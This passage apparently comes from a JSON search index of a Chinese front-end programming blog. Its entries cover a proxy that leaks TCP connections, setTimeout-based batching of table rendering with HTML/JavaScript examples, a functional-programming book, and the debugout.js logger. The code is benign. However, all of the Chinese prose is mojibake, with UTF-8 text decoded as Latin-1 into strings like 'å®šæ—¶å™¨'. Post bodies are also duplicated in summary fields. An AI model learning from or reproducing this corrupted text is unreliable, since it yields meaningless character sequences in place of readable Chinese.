tcpé“¾æ¥ä¸æ–­å¼€ï¼Œå¯¼è‡´æœåŠ¡å™¨å†…å­˜è¿‡é«˜ï¼Œå†…å­˜æ³„éœ² èŠ‚ç‚¹iowaité«˜ åœ¨æˆ‘ä»¬è‡ªå·±çš„ä»£ç†çš„ä»£ç ä¸­ï¼Œæˆ‘æœ‰å‘ç°ï¼Œåœ¨ä»£ç†è¿›è¡Œè½¬å‘æ—¶ï¼Œåªåˆ é™¤äº†headers.host, å¹¶æ²¡æœ‰åˆ é™¤headers.Connectionç­‰é€è·³é¦–éƒ¨çš„å­—æ®µ\ndelete req.headers.host var option = { url: url, headers: req.","title":"å“‘ä»£ç† - TCPé“¾æ¥é«˜Recv-Qï¼Œå†…å­˜æ³„éœ²çš„ç½ªé­ç¥¸é¦–"},{"content":"å¯¹äºæ‰§è¡Œæ—¶é—´è¿‡é•¿çš„è„šæœ¬ï¼Œæœ‰çš„æµè§ˆå™¨ä¼šå¼¹å‡ºè­¦å‘Šï¼Œè¯´é¡µé¢æ— å“åº”ã€‚æœ‰çš„æµè§ˆå™¨ä¼šç›´æ¥ç»ˆæ­¢è„šæœ¬ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæµè§ˆå™¨ä¸å¸Œæœ›æŸä¸€ä¸ªä»£ç å—é•¿æ—¶é—´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå› ä¸ºjsæ˜¯å•çº¿ç¨‹çš„ã€‚ä¸€ä¸ªä»£ç å—é•¿æ—¶é—´è¿è¡Œï¼Œå°†ä¼šå¯¼è‡´å…¶ä»–ä»»ä½•ä»»åŠ¡éƒ½å¿…é¡»ç­‰å¾…ã€‚ä»ç”¨æˆ·ä½“éªŒä¸Šæ¥è¯´ï¼Œå¾ˆæœ‰å¯èƒ½å‘ç”Ÿé¡µé¢æ¸²æŸ“å¡é¡¿æˆ–è€…ç‚¹å‡»äº‹ä»¶æ— å“åº”çš„çŠ¶æ€ã€‚\nå¦‚æœä¸€æ®µè„šæœ¬çš„è¿è¡Œæ—¶é—´è¶…è¿‡5ç§’ï¼Œæœ‰äº›æµè§ˆå™¨ï¼ˆæ¯”å¦‚Firefoxå’ŒOperaï¼‰å°†å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†è­¦å‘Šç”¨æˆ·è¯¥è„šæœ¬â€œæ— æ³•å“åº”â€ã€‚è€Œå…¶ä»–æµè§ˆå™¨ï¼Œæ¯”å¦‚iPhoneä¸Šçš„æµè§ˆå™¨ï¼Œå°†é»˜è®¤ç»ˆæ­¢è¿è¡Œæ—¶é—´è¶…è¿‡5ç§’é’Ÿçš„è„šæœ¬ã€‚\u0026ndash;ã€ŠJavaScriptå¿è€…ç§˜ç±ã€‹\nJavaScriptå¿è€…ç§˜ç±é‡Œæœ‰ä¸ªå¾ˆå¥½çš„æ¯”å–»ï¼šé¡µé¢ä¸Šå‘ç”Ÿçš„å„ç§äº‹æƒ…å°±å¥½åƒä¸€ç¾¤äººåœ¨è®¨è®ºäº‹æƒ…ï¼Œå¦‚æœæœ‰ä¸ªäººä¸€ç›´åœ¨è¯´ä¸ªä¸åœï¼Œå…¶ä»–äººè‚¯å®šä¸ä¹æ„ã€‚æˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªè£åˆ¤ï¼Œå®šæ—¶çš„åˆ‡æ¢å…¶ä»–äººæ¥è¯´è¯ã€‚\nJsåˆ©ç”¨å®šæ—¶å™¨æ¥åˆ†è§£ä»»åŠ¡ï¼Œå…³é”®ç‚¹æœ‰ä¸¤ä¸ªã€‚\næŒ‰ä»€ä¹ˆç»´åº¦å»åˆ†è§£ä»»åŠ¡\nä»»åŠ¡çš„ç°åœºä¿å­˜ä¸ç°åœºæ¢å¤\n1. ä¾‹å­ è¦æ±‚ï¼šåŠ¨æ€åˆ›å»ºä¸€ä¸ªè¡¨æ ¼ï¼Œä¸€å…±10000è¡Œï¼Œæ¯è¡Œ10ä¸ªå•å…ƒæ ¼\n1.1. ä¸€æ¬¡æ€§åˆ›å»º \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tbody\u0026gt;\u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var tbody = document.getElementsByTagName(\u0026#39;tbody\u0026#39;)[0]; var allLines = 10000; // æ¯æ¬¡æ¸²æŸ“çš„è¡Œæ•° console.time(\u0026#39;wd\u0026#39;); for(var i=0; i\u0026lt;allLines; i++){ var tr = document.createElement(\u0026#39;tr\u0026#39;); for(var j=0; j\u0026lt;10; j++){ var td = document.createElement(\u0026#39;td\u0026#39;); td.appendChild(document.createTextNode(i+\u0026#39;,\u0026#39;+j)); tr.appendChild(td); } tbody.appendChild(tr); } console.timeEnd(\u0026#39;wd\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ€»å…±è€—æ—¶180ms, æµè§ˆå™¨å·²ç»ç»™å‡ºè­¦å‘Šï¼[Violation] 'setTimeout' handler took 53msã€‚\n1.2. åˆ†æ‰¹æ¬¡åŠ¨æ€åˆ›å»º \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tbody\u0026gt;\u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var tbody = document.getElementsByTagName(\u0026#39;tbody\u0026#39;)[0]; var allLines = 10000; // æ¯æ¬¡æ¸²æŸ“çš„è¡Œæ•° var everyTimeCreateLines = 80; // å½“å‰è¡Œ var currentLine = 0; setTimeout(function renderTable(){ console.time(\u0026#39;wd\u0026#39;); for(var i=currentLine; i\u0026lt;currentLine+everyTimeCreateLines \u0026amp;\u0026amp; i\u0026lt;allLines; i++){ var tr = document.createElement(\u0026#39;tr\u0026#39;); for(var j=0; j\u0026lt;10; j++){ var td = document.createElement(\u0026#39;td\u0026#39;); td.appendChild(document.createTextNode(i+\u0026#39;,\u0026#39;+j)); tr.appendChild(td); } tbody.appendChild(tr); } console.timeEnd(\u0026#39;wd\u0026#39;); currentLine = i; if(currentLine \u0026lt; allLines){ setTimeout(renderTable,0); } },0); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è¿™æ¬¡å¼‚æ­¥æŒ‰æ‰¹æ¬¡åˆ›å»ºï¼Œæ²¡æœ‰è€—æ—¶çš„è­¦å‘Šã€‚å› ä¸ºæ§åˆ¶äº†æ¯æ¬¡ä»£ç åœ¨50mså†…è¿è¡Œã€‚å®é™…ä¸Šæ¯80è¡Œè€—æ—¶çº¦10mså·¦å³ã€‚è¿™å°±ä¸ä¼šå¼•èµ·é¡µé¢å¡é¡¿ç­‰é—®é¢˜ã€‚\n","permalink":"https://wdd.js.org/posts/2018/02/settimeout-to-splice-big-work/","summary":"å¯¹äºæ‰§è¡Œæ—¶é—´è¿‡é•¿çš„è„šæœ¬ï¼Œæœ‰çš„æµè§ˆå™¨ä¼šå¼¹å‡ºè­¦å‘Šï¼Œè¯´é¡µé¢æ— å“åº”ã€‚æœ‰çš„æµè§ˆå™¨ä¼šç›´æ¥ç»ˆæ­¢è„šæœ¬ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæµè§ˆå™¨ä¸å¸Œæœ›æŸä¸€ä¸ªä»£ç å—é•¿æ—¶é—´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå› ä¸ºjsæ˜¯å•çº¿ç¨‹çš„ã€‚ä¸€ä¸ªä»£ç å—é•¿æ—¶é—´è¿è¡Œï¼Œå°†ä¼šå¯¼è‡´å…¶ä»–ä»»ä½•ä»»åŠ¡éƒ½å¿…é¡»ç­‰å¾…ã€‚ä»ç”¨æˆ·ä½“éªŒä¸Šæ¥è¯´ï¼Œå¾ˆæœ‰å¯èƒ½å‘ç”Ÿé¡µé¢æ¸²æŸ“å¡é¡¿æˆ–è€…ç‚¹å‡»äº‹ä»¶æ— å“åº”çš„çŠ¶æ€ã€‚\nå¦‚æœä¸€æ®µè„šæœ¬çš„è¿è¡Œæ—¶é—´è¶…è¿‡5ç§’ï¼Œæœ‰äº›æµè§ˆå™¨ï¼ˆæ¯”å¦‚Firefoxå’ŒOperaï¼‰å°†å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†è­¦å‘Šç”¨æˆ·è¯¥è„šæœ¬â€œæ— æ³•å“åº”â€ã€‚è€Œå…¶ä»–æµè§ˆå™¨ï¼Œæ¯”å¦‚iPhoneä¸Šçš„æµè§ˆå™¨ï¼Œå°†é»˜è®¤ç»ˆæ­¢è¿è¡Œæ—¶é—´è¶…è¿‡5ç§’é’Ÿçš„è„šæœ¬ã€‚\u0026ndash;ã€ŠJavaScriptå¿è€…ç§˜ç±ã€‹\nJavaScriptå¿è€…ç§˜ç±é‡Œæœ‰ä¸ªå¾ˆå¥½çš„æ¯”å–»ï¼šé¡µé¢ä¸Šå‘ç”Ÿçš„å„ç§äº‹æƒ…å°±å¥½åƒä¸€ç¾¤äººåœ¨è®¨è®ºäº‹æƒ…ï¼Œå¦‚æœæœ‰ä¸ªäººä¸€ç›´åœ¨è¯´ä¸ªä¸åœï¼Œå…¶ä»–äººè‚¯å®šä¸ä¹æ„ã€‚æˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªè£åˆ¤ï¼Œå®šæ—¶çš„åˆ‡æ¢å…¶ä»–äººæ¥è¯´è¯ã€‚\nJsåˆ©ç”¨å®šæ—¶å™¨æ¥åˆ†è§£ä»»åŠ¡ï¼Œå…³é”®ç‚¹æœ‰ä¸¤ä¸ªã€‚\næŒ‰ä»€ä¹ˆç»´åº¦å»åˆ†è§£ä»»åŠ¡\nä»»åŠ¡çš„ç°åœºä¿å­˜ä¸ç°åœºæ¢å¤\n1. ä¾‹å­ è¦æ±‚ï¼šåŠ¨æ€åˆ›å»ºä¸€ä¸ªè¡¨æ ¼ï¼Œä¸€å…±10000è¡Œï¼Œæ¯è¡Œ10ä¸ªå•å…ƒæ ¼\n1.1. ä¸€æ¬¡æ€§åˆ›å»º \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tbody\u0026gt;\u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var tbody = document.getElementsByTagName(\u0026#39;tbody\u0026#39;)[0]; var allLines = 10000; // æ¯æ¬¡æ¸²æŸ“çš„è¡Œæ•° console.time(\u0026#39;wd\u0026#39;); for(var i=0; i\u0026lt;allLines; i++){ var tr = document.createElement(\u0026#39;tr\u0026#39;); for(var j=0; j\u0026lt;10; j++){ var td = document.createElement(\u0026#39;td\u0026#39;); td.appendChild(document.createTextNode(i+\u0026#39;,\u0026#39;+j)); tr.appendChild(td); } tbody.appendChild(tr); } console.timeEnd(\u0026#39;wd\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ€»å…±è€—æ—¶180ms, æµè§ˆå™¨å·²ç»ç»™å‡ºè­¦å‘Šï¼[Violation] 'setTimeout' handler took 53msã€‚\n1.2. åˆ†æ‰¹æ¬¡åŠ¨æ€åˆ›å»º \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tbody\u0026gt;\u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var tbody = document.","title":"å®šæ—¶å™¨å­¦ä¹ ï¼šåˆ©ç”¨å®šæ—¶å™¨åˆ†è§£è€—æ—¶ä»»åŠ¡æ¡ˆä¾‹"},{"content":" æˆ‘çˆ¶äº²ä»¥å‰è·Ÿæˆ‘è¯´è¿‡ï¼Œæœ‰äº›äº‹ç‰©åœ¨ä½ å¾—åˆ°ä¹‹å‰æ˜¯æ— è¶³è½»é‡çš„ï¼Œå¾—åˆ°ä¹‹åå°±ä¸å¯æˆ–ç¼ºäº†ã€‚å¾®æ³¢ç‚‰æ˜¯è¿™æ ·ï¼Œæ™ºèƒ½æ‰‹æœºæ˜¯è¿™æ ·ï¼Œäº’è”ç½‘ä¹Ÿæ˜¯è¿™æ ·â€”â€”è€äººä»¬åœ¨æ²¡æœ‰äº’è”ç½‘çš„æ—¶å€™è¿‡å¾—ä¹Ÿå¾ˆå……å®ã€‚å¯¹æˆ‘æ¥è¯´ï¼Œå‡½æ•°çš„æŸ¯é‡ŒåŒ–ï¼ˆcurryï¼‰ä¹Ÿæ˜¯è¿™æ ·ã€‚\nç„¶åæˆ‘ç»§ç»­çœ‹äº†è¿™æœ¬ä¹¦çš„ä¸­æ–‡ç‰ˆã€‚æœ‰äº›é†é†çŒé¡¶çš„æ„Ÿè§‰ã€‚ éšä¹‹åœ¨githubæœäº†ä¸€ä¸‹ã€‚ æˆ‘æƒ³ï¼Œå³ä½¿ä»˜è´¹ï¼Œæˆ‘ä¹Ÿæ„¿æ„çœ‹ã€‚\nä¸­æ–‡ç‰ˆåœ°å€ï¼šhttps://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details githubåŸæ–‡åœ°å€ï¼šhttps://github.com/MostlyAdequate/mostly-adequate-guide\n1. åè®° å…¶å®æˆ‘æ˜¯æƒ³å­¦ç‚¹å‡½æ•°æŸ¯é‡ŒåŒ–çš„ä¸œè¥¿ï¼Œç„¶åç”¨è°·æ­Œæœç´¢äº†ä¸€ä¸‹ã€‚ç¬¬ä¸€ä¸ªç»“æœå°±æ˜¯è¿™æœ¬ä¹¦ã€‚éå¸¸æ„Ÿè°¢è°·æ­Œæœç´¢ï¼Œå¦‚æœæˆ‘ç”¨ç™¾åº¦ï¼Œå¯èƒ½å°±æ²¡æœ‰ç¼˜åˆ†é‡åˆ°è¿™æœ¬ä¹¦äº†ã€‚\n","permalink":"https://wdd.js.org/posts/2018/02/js-functional-programming/","summary":"æˆ‘çˆ¶äº²ä»¥å‰è·Ÿæˆ‘è¯´è¿‡ï¼Œæœ‰äº›äº‹ç‰©åœ¨ä½ å¾—åˆ°ä¹‹å‰æ˜¯æ— è¶³è½»é‡çš„ï¼Œå¾—åˆ°ä¹‹åå°±ä¸å¯æˆ–ç¼ºäº†ã€‚å¾®æ³¢ç‚‰æ˜¯è¿™æ ·ï¼Œæ™ºèƒ½æ‰‹æœºæ˜¯è¿™æ ·ï¼Œäº’è”ç½‘ä¹Ÿæ˜¯è¿™æ ·â€”â€”è€äººä»¬åœ¨æ²¡æœ‰äº’è”ç½‘çš„æ—¶å€™è¿‡å¾—ä¹Ÿå¾ˆå……å®ã€‚å¯¹æˆ‘æ¥è¯´ï¼Œå‡½æ•°çš„æŸ¯é‡ŒåŒ–ï¼ˆcurryï¼‰ä¹Ÿæ˜¯è¿™æ ·ã€‚\nç„¶åæˆ‘ç»§ç»­çœ‹äº†è¿™æœ¬ä¹¦çš„ä¸­æ–‡ç‰ˆã€‚æœ‰äº›é†é†çŒé¡¶çš„æ„Ÿè§‰ã€‚ éšä¹‹åœ¨githubæœäº†ä¸€ä¸‹ã€‚ æˆ‘æƒ³ï¼Œå³ä½¿ä»˜è´¹ï¼Œæˆ‘ä¹Ÿæ„¿æ„çœ‹ã€‚\nä¸­æ–‡ç‰ˆåœ°å€ï¼šhttps://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details githubåŸæ–‡åœ°å€ï¼šhttps://github.com/MostlyAdequate/mostly-adequate-guide\n1. åè®° å…¶å®æˆ‘æ˜¯æƒ³å­¦ç‚¹å‡½æ•°æŸ¯é‡ŒåŒ–çš„ä¸œè¥¿ï¼Œç„¶åç”¨è°·æ­Œæœç´¢äº†ä¸€ä¸‹ã€‚ç¬¬ä¸€ä¸ªç»“æœå°±æ˜¯è¿™æœ¬ä¹¦ã€‚éå¸¸æ„Ÿè°¢è°·æ­Œæœç´¢ï¼Œå¦‚æœæˆ‘ç”¨ç™¾åº¦ï¼Œå¯èƒ½å°±æ²¡æœ‰ç¼˜åˆ†é‡åˆ°è¿™æœ¬ä¹¦äº†ã€‚","title":"å…³äºJavaScroptå‡½æ•°å¼ç¼–ç¨‹ï¼Œæˆ‘å¤šä¹ˆå¸Œæœ›èƒ½æ—©ç‚¹çœ‹åˆ°è¿™æœ¬ä¹¦"},{"content":" æœ¬ç¯‡æ–‡ç« æ¥è‡ªä¸€ä¸ªéœ€æ±‚ï¼Œå‰ç«¯websocketä¼šæ”¶åˆ°å„ç§æ¶ˆæ¯ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™ï¼Œæˆ‘å¸Œæœ›æŠŠwebsoektæ¨é€è¿‡æ¥çš„æ¶ˆæ¯éƒ½ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œå¦‚æœå‡ºé—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘å¯ä»¥æŠŠè¿™äº›æ¶ˆæ¯çš„æ—¥å¿—æ–‡ä»¶æäº¤ç»™åç«¯å¼€å‘åŒºåˆ†æé”™è¯¯ã€‚ä½†æ˜¯åœ¨æµè§ˆå™¨é‡Œï¼Œjsä¸€èˆ¬æ˜¯ä¸èƒ½å†™æ–‡ä»¶çš„ã€‚é¼ æ ‡å¦å­˜ä¸ºçš„æ–¹æ³•ä¹Ÿæ˜¯ä¸å¤ªå¥½ï¼Œå› ä¸ºä¼šä¿å­˜æ‰€æœ‰çš„console.logçš„è¾“å‡ºã€‚äºæ˜¯ï¼Œç»ˆäºæ‰¾åˆ°è¿™ä¸ªdebugout.jsã€‚\ndebugout.jsçš„åŸç†æ˜¯å°†æ‰€æœ‰æ—¥å¿—åºåˆ—åŒ–åï¼Œä¿å­˜åˆ°ä¸€ä¸ªå˜é‡é‡Œã€‚å½“ç„¶è¿™ä¸ªå˜é‡ä¸ä¼šæ— é™å¤§ï¼Œå› ä¸ºé»˜è®¤çš„æœ€å¤§æ—¥å¿—é™åˆ¶æ˜¯2500è¡Œï¼Œè¿™ä¸ªæ˜¯å¯é…ç½®çš„ã€‚å¦å¤–ï¼Œdebugout.jsä¹Ÿæ”¯æŒåœ¨localStorageé‡Œå­˜å‚¨æ—¥å¿—çš„ã€‚\n1. debugout.js ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨æ‰“å¼€consoleé¢æ¿ï¼Œç„¶åå³é”®saveï¼Œæ˜¯å¯ä»¥å°†console.logè¾“å‡ºçš„ä¿¡æ¯å¦å­˜ä¸ºlogæ–‡ä»¶çš„ã€‚ä½†æ˜¯è¿™å°±æŠŠæ‰€æœ‰çš„æ—¥å¿—éƒ½åŒ…å«è¿›æ¥äº†ï¼Œå¦‚ä½•åªä¿å­˜æˆ‘æƒ³è¦çš„æ—¥å¿—å‘¢ï¼Ÿ\nï¼ˆè°ƒè¯•è¾“å‡ºï¼‰ä»æ‚¨çš„æ—¥å¿—ä¸­ç”Ÿæˆå¯ä»¥æœç´¢ï¼Œæ—¶é—´æˆ³ï¼Œä¸‹è½½ç­‰çš„æ–‡æœ¬æ–‡ä»¶ã€‚ å‚è§ä¸‹é¢çš„ä¸€äº›ä¾‹å­ã€‚\nDebugoutçš„logï¼ˆï¼‰æ¥å—ä»»ä½•ç±»å‹çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬å‡½æ•°ã€‚ Debugoutä¸æ˜¯ä¸€ä¸ªçŒ´å­è¡¥ä¸ï¼Œè€Œæ˜¯ä¸€ä¸ªå•ç‹¬çš„è®°å½•ç±»ï¼Œä½ ä½¿ç”¨è€Œä¸æ˜¯æ§åˆ¶å°ã€‚\nè°ƒè¯•çš„ä¸€äº›äº®ç‚¹ï¼š\nåœ¨è¿è¡Œæ—¶æˆ–ä»»ä½•æ—¶é—´è·å–æ•´ä¸ªæ—¥å¿—æˆ–å°¾éƒ¨ æœç´¢å¹¶åˆ‡ç‰‡æ—¥å¿— æ›´å¥½åœ°äº†è§£å¯é€‰æ—¶é—´æˆ³çš„ä½¿ç”¨æ¨¡å¼ åœ¨ä¸€ä¸ªåœ°æ–¹åˆ‡æ¢å®æ—¶æ—¥å¿—è®°å½•ï¼ˆconsole.logï¼‰ å¯é€‰åœ°å°†è¾“å‡ºå­˜å‚¨åœ¨window.localStorageä¸­ï¼Œå¹¶åœ¨æ¯ä¸ªä¼šè¯ä¸­æŒç»­æ·»åŠ åˆ°åŒä¸€ä¸ªæ—¥å¿— å¯é€‰åœ°ï¼Œå°†æ—¥å¿—ä¸Šé™ä¸ºXä¸ªæœ€æ–°è¡Œä»¥é™åˆ¶å†…å­˜æ¶ˆè€— ä¸‹å›¾æ˜¯ä½¿ç”¨downloadLogæ–¹æ³•ä¸‹è½½çš„æ—¥å¿—æ–‡ä»¶ã€‚\nå®˜æ–¹æä¾›çš„demoç¤ºä¾‹ï¼Œæ¬¢è¿è¯•ç©ã€‚http://inorganik.github.io/debugout.js/\n2. ä½¿ç”¨ åœ¨è„šæœ¬é¡¶éƒ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„è°ƒè¯•å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨debugoutçš„æ—¥å¿—æ–¹æ³•æ›¿æ¢æ‰€æœ‰æ§åˆ¶å°æ—¥å¿—æ–¹æ³•ï¼š\nvar bugout = new debugout(); // instead of console.log(\u0026#39;some object or string\u0026#39;) bugout.log(\u0026#39;some object or string\u0026#39;); 3. API log() -åƒconsole.log(), ä½†æ˜¯ä¼šè‡ªåŠ¨å­˜å‚¨ getLog() - è¿”å›æ‰€æœ‰æ—¥å¿— tail(numLines) - è¿”å›å°¾éƒ¨æ‰§è¡Œè¡Œæ—¥å¿—ï¼Œé»˜è®¤100è¡Œ search(string) - æœç´¢æ—¥å¿— getSlice(start, numLines) - æ—¥å¿—åˆ‡å‰² downloadLog() - ä¸‹è½½æ—¥å¿— clear() - æ¸…ç©ºæ—¥å¿— determineType() - ä¸€ä¸ªæ›´ç»†ç²’åº¦çš„typeofä¸ºæ‚¨æä¾›æ–¹ä¾¿ 4. å¯é€‰é…ç½® Â·Â·Â· // log in real time (forwards to console.log) self.realTimeLoggingOn = true; // insert a timestamp in front of each log self.useTimestamps = false; // store the output using window.localStorage() and continuously add to the same log each session self.useLocalStorage = false; // set to false after you\u0026rsquo;re done debugging to avoid the log eating up memory self.recordLogs = true; // to avoid the log eating up potentially endless memory self.autoTrim = true; // if autoTrim is true, this many most recent lines are saved self.maxLines = 2500; // how many lines tail() will retrieve self.tailNumLines = 100; // filename of log downloaded with downloadLog() self.logFilename = \u0026rsquo;log.txt\u0026rsquo;; // max recursion depth for logged objects self.maxDepth = 25; Â·Â·Â·\n5. é¡¹ç›®åœ°å€ https://github.com/inorganik/debugout.js\n6. å¦å¤– æˆ‘è‡ªå·±ä¹Ÿæ¨¡ä»¿debugout.jså†™äº†ä¸€ä¸ªæ—¥å¿—ä¿å­˜çš„é¡¹ç›®ï¼Œè¯¥é¡¹ç›®å¯ä»¥åœ¨ie10åŠä»¥ä¸Šä¸‹è½½æ—¥å¿—ã€‚ debugout.jsåœ¨ieæµè§ˆå™¨ä¸Šä¸‹è½½æ—¥å¿—çš„æ–¹å¼æ˜¯æœ‰é—®é¢˜çš„ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/wangduanduan/log4b.git\n","permalink":"https://wdd.js.org/posts/2018/02/save-console-log-as-file/","summary":"æœ¬ç¯‡æ–‡ç« æ¥è‡ªä¸€ä¸ªéœ€æ±‚ï¼Œå‰ç«¯websocketä¼šæ”¶åˆ°å„ç§æ¶ˆæ¯ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™ï¼Œæˆ‘å¸Œæœ›æŠŠwebsoektæ¨é€è¿‡æ¥çš„æ¶ˆæ¯éƒ½ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œå¦‚æœå‡ºé—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘å¯ä»¥æŠŠè¿™äº›æ¶ˆæ¯çš„æ—¥å¿—æ–‡ä»¶æäº¤ç»™åç«¯å¼€å‘åŒºåˆ†æé”™è¯¯ã€‚ä½†æ˜¯åœ¨æµè§ˆå™¨é‡Œï¼Œjsä¸€èˆ¬æ˜¯ä¸èƒ½å†™æ–‡ä»¶çš„ã€‚é¼ æ ‡å¦å­˜ä¸ºçš„æ–¹æ³•ä¹Ÿæ˜¯ä¸å¤ªå¥½ï¼Œå› ä¸ºä¼šä¿å­˜æ‰€æœ‰çš„console.logçš„è¾“å‡ºã€‚äºæ˜¯ï¼Œç»ˆäºæ‰¾åˆ°è¿™ä¸ªdebugout.jsã€‚\ndebugout.jsçš„åŸç†æ˜¯å°†æ‰€æœ‰æ—¥å¿—åºåˆ—åŒ–åï¼Œä¿å­˜åˆ°ä¸€ä¸ªå˜é‡é‡Œã€‚å½“ç„¶è¿™ä¸ªå˜é‡ä¸ä¼šæ— é™å¤§ï¼Œå› ä¸ºé»˜è®¤çš„æœ€å¤§æ—¥å¿—é™åˆ¶æ˜¯2500è¡Œï¼Œè¿™ä¸ªæ˜¯å¯é…ç½®çš„ã€‚å¦å¤–ï¼Œdebugout.jsä¹Ÿæ”¯æŒåœ¨localStorageé‡Œå­˜å‚¨æ—¥å¿—çš„ã€‚\n1. debugout.js ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨æ‰“å¼€consoleé¢æ¿ï¼Œç„¶åå³é”®saveï¼Œæ˜¯å¯ä»¥å°†console.logè¾“å‡ºçš„ä¿¡æ¯å¦å­˜ä¸ºlogæ–‡ä»¶çš„ã€‚ä½†æ˜¯è¿™å°±æŠŠæ‰€æœ‰çš„æ—¥å¿—éƒ½åŒ…å«è¿›æ¥äº†ï¼Œå¦‚ä½•åªä¿å­˜æˆ‘æƒ³è¦çš„æ—¥å¿—å‘¢ï¼Ÿ\nï¼ˆè°ƒè¯•è¾“å‡ºï¼‰ä»æ‚¨çš„æ—¥å¿—ä¸­ç”Ÿæˆå¯ä»¥æœç´¢ï¼Œæ—¶é—´æˆ³ï¼Œä¸‹è½½ç­‰çš„æ–‡æœ¬æ–‡ä»¶ã€‚ å‚è§ä¸‹é¢çš„ä¸€äº›ä¾‹å­ã€‚\nDebugoutçš„logï¼ˆï¼‰æ¥å—ä»»ä½•ç±»å‹çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬å‡½æ•°ã€‚ Debugoutä¸æ˜¯ä¸€ä¸ªçŒ´å­è¡¥ä¸ï¼Œè€Œæ˜¯ä¸€ä¸ªå•ç‹¬çš„è®°å½•ç±»ï¼Œä½ ä½¿ç”¨è€Œä¸æ˜¯æ§åˆ¶å°ã€‚\nè°ƒè¯•çš„ä¸€äº›äº®ç‚¹ï¼š\nåœ¨è¿è¡Œæ—¶æˆ–ä»»ä½•æ—¶é—´è·å–æ•´ä¸ªæ—¥å¿—æˆ–å°¾éƒ¨ æœç´¢å¹¶åˆ‡ç‰‡æ—¥å¿— æ›´å¥½åœ°äº†è§£å¯é€‰æ—¶é—´æˆ³çš„ä½¿ç”¨æ¨¡å¼ åœ¨ä¸€ä¸ªåœ°æ–¹åˆ‡æ¢å®æ—¶æ—¥å¿—è®°å½•ï¼ˆconsole.logï¼‰ å¯é€‰åœ°å°†è¾“å‡ºå­˜å‚¨åœ¨window.localStorageä¸­ï¼Œå¹¶åœ¨æ¯ä¸ªä¼šè¯ä¸­æŒç»­æ·»åŠ åˆ°åŒä¸€ä¸ªæ—¥å¿— å¯é€‰åœ°ï¼Œå°†æ—¥å¿—ä¸Šé™ä¸ºXä¸ªæœ€æ–°è¡Œä»¥é™åˆ¶å†…å­˜æ¶ˆè€— ä¸‹å›¾æ˜¯ä½¿ç”¨downloadLogæ–¹æ³•ä¸‹è½½çš„æ—¥å¿—æ–‡ä»¶ã€‚\nå®˜æ–¹æä¾›çš„demoç¤ºä¾‹ï¼Œæ¬¢è¿è¯•ç©ã€‚http://inorganik.github.io/debugout.js/\n2. ä½¿ç”¨ åœ¨è„šæœ¬é¡¶éƒ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„è°ƒè¯•å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨debugoutçš„æ—¥å¿—æ–¹æ³•æ›¿æ¢æ‰€æœ‰æ§åˆ¶å°æ—¥å¿—æ–¹æ³•ï¼š\nvar bugout = new debugout(); // instead of console.log(\u0026#39;some object or string\u0026#39;) bugout.log(\u0026#39;some object or string\u0026#39;); 3. API log() -åƒconsole.log(), 